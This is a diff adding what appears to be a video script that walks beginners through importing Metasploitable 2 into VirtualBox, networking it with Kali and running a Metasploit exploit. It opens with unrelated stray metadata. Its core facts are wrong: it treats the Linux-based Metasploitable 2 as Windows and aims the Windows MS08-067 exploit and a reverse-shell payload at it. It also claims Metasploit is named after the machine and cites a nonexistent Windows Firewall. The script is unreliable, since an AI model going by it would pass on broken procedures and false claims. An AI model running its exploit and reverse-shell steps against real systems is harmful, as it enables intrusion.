@@ -1,0 +1,51 @@
+metasploitable 2 virtualbox kali linux
+search: cehennemin dibi
+tutorial: False
+
+When I first started in cybersecurity, there was one name that came up everywhere. Metasploitable 2. It was the ultimate 'hack me' machine. But here is the part most people get wrong: they try to download it and run it, and it just doesn't work the way the old tutorials say. If you are searching for how to get this running on VirtualBox with Kali Linux today, you are in the right place. By the end of this video, I will show you exactly how to download the image, set up the network, and get that first exploit running step-by-step. We will also cover the common mistakes that break the setup, so you don't waste your time.
+
+But first, why does this even matter? Here is a surprising fact: Metasploitable 2 was released over a decade ago, yet it is still the very first virtual machine most cybersecurity students spin up. It is the educational standard for a reason. It contains dozens of known vulnerabilities, from old services running with default passwords to ancient operating system flaws. It is the perfect sandbox to learn how exploits work without risking anything real.
+
+So, what exactly will you get by the end? You will have a fully functional Metasploitable 2 machine running on VirtualBox. You will see the exact commands to set the IP address, how to ping it from Kali, and how to launch a basic Metasploit exploit. We will also discuss how to do this safely and legally on your own lab network.
+
+[HOOK TRANSITION]
+
+Alright, let's get into it. The first thing you need is the image. You cannot just Google 'Metasploitable 2 download' and expect a simple .iso file. That is a common mistake. You need a specific VMware image, usually in .vmx or .vmdk format. Once you have that file, open VirtualBox. Go to 'File', then 'Import Appliance'. Browse to where you saved that file. Click 'Next'. VirtualBox will read the settings. You might notice the disk size is huge, maybe 20 or 30 gigabytes. That is normal. Just click 'Import'.
+
+Now, here is the part most people get wrong. By default, the network adapter in VirtualBox is set to 'NAT'. This means your Metasploitable 2 can access the internet, but Kali Linux cannot see it on the local network. For hacking labs, we need 'Bridged Adapter'. Go to the Settings of your new VM, click 'Network', and change 'Attached to' from NAT to Bridged Adapter. Make sure you select your actual physical network adapter from the dropdown menu. This is the step that fixes 90% of connection issues. Without this, Metasploitable 2 is invisible to Kali.
+
+Click 'OK', and start the virtual machine. It will boot up. You will see a login prompt. The default username is 'msfadmin' and the password is 'msfadmin'. Type those in. You are now inside the vulnerable operating system.
+
+But wait, we need to know its IP address so Kali can talk to it. In Metasploitable, type 'ifconfig'. Look for the interface, usually eth0. You will see an IP address. Write that down. That is the target.
+
+Now, switch over to your Kali Linux terminal. We need to ping this IP to confirm the connection is working. Type 'ping <IP_ADDRESS_FROM_IFCONFIG>'. If you see replies, you have succeeded. If you see 'Destination Host Unreachable', go back to VirtualBox settings and make sure that Bridged Adapter is selected correctly and that the correct physical adapter is chosen. This simple ping test is the final check the title promised.
+
+[TEASE]
+
+But here is the part most people get wrong: they stop after the ping. They think, 'Great, I'm in.' But a vulnerable machine is useless if you don't know how to use it. In the next minute, I will show you how to use Metasploit, the framework named after this machine, to find and run an exploit automatically. Stay tuned, because this is where the real learning happens.
+
+Alright, you have the ping working. That means your network is configured. Now, let's talk about the metaphor for this whole process. Think of Metasploitable 2 as a house with the doors wide open and the windows unlocked. The IP address is the street address. Kali Linux is the security researcher. The exploits are just the tools we use to walk through those open doors to see where the locks are weak. We aren't breaking in to steal things; we are walking in to see if we can, and then we lock the door behind us.
+
+Now, let's launch an exploit. In Kali, open the terminal and type 'msfconsole'. This launches the Metasploit Framework. It is a huge database of exploits. To find one for Metasploitable 2, type 'search ms08_067'. This is a famous vulnerability in the Windows Server service. Metasploitable 2 has it installed by default. You will see a list of results. You want the one marked as 'unpatched' or 'native', usually listed as 'exploit/windows/smb/ms08_067'. Select that one by typing its number or copying the full path.
+
+Now, we need to set up the target. Type 'set RHOST <IP_ADDRESS_FROM_IFCONFIG>'. This is the IP we got from the ifconfig command earlier. Next, type 'set RPORT 445'. This is the port the vulnerability uses. Now, check the available payloads by typing 'show payloads'. For this exploit, a common and safe educational payload is 'set PAYLOAD windows/shell_reverse_tcp'. Then, type 'set LHOST <KALI_IP_ADDRESS>' to set your attacking machine's IP. Finally, type 'exploit'.
+
+[COMMON MISTAKES / PRO TIPS]
+
+Now, I know what some of you are thinking. 'Why is this so old? Why not just use a newer machine?' That is a great question. The reason we use Metasploitable 2 is that it is intentionally vulnerable. Newer operating systems patch these holes. By using an old machine, we see the exact code path of the exploit. We see how a buffer overflow works in real-time. It is like learning to swim in a shallow pool before the deep end.
+
+A common myth is that you need the latest version of Kali to do this. Not true. Even an older version of Kali will work, as long as the Metasploit framework is updated. **A critical mistake is forgetting to update Metasploit itself. Before you start, type 'msfupdate' in the terminal to ensure you have the latest exploit modules.** Another mistake is forgetting to take a snapshot. In VirtualBox, go to 'Machine', then 'Take Snapshot'. Name it 'Clean Install'. If you mess up the configuration or accidentally break the OS, you can just revert to that snapshot. It saves hours of frustration.
+
+Also, a frequent issue is the Windows Firewall. By default, Metasploitable 2's Windows instance may block the incoming reverse shell connection from Kali. Before launching the exploit, ensure the Windows Firewall is disabled or allows incoming connections on port 445. If the exploit runs but you get no shell, this is the first thing to check.
+
+[RECAP]
+
+Let's recap what we covered today. First, we downloaded the Metasploitable 2 VMware image and imported it into VirtualBox. Second, we changed the network setting from NAT to Bridged Adapter so Kali could see the target. We ensured we selected the correct physical network adapter from the dropdown menu. Third, we logged in with the default credentials and found the IP address using ifconfig. Fourth, we pinged the IP to confirm the connection. And fifth, we launched the MS08_067 exploit using Metasploit to target that IP.
+
+[CALL TO ACTION]
+
+So, that is the full build and exploit guide for Metasploitable 2. I hope that step-by-step walkthrough saved you the headache of searching through outdated forums.
+
+Here is your question for the comments: Which of these three commands did you find most useful: the 'ifconfig' command to find the IP, the 'ping' command to test the connection, or the 'msfconsole' command to start the exploit? Let me know by typing the command name in the comments below.
+
+If you found this video helpful, smash that like button it helps the algorithm reach other beginners. And if you want to see us build a more modern vulnerable lab next, hit the subscribe button and ring the bell. Thanks for watching, and I'll see you in the next video.
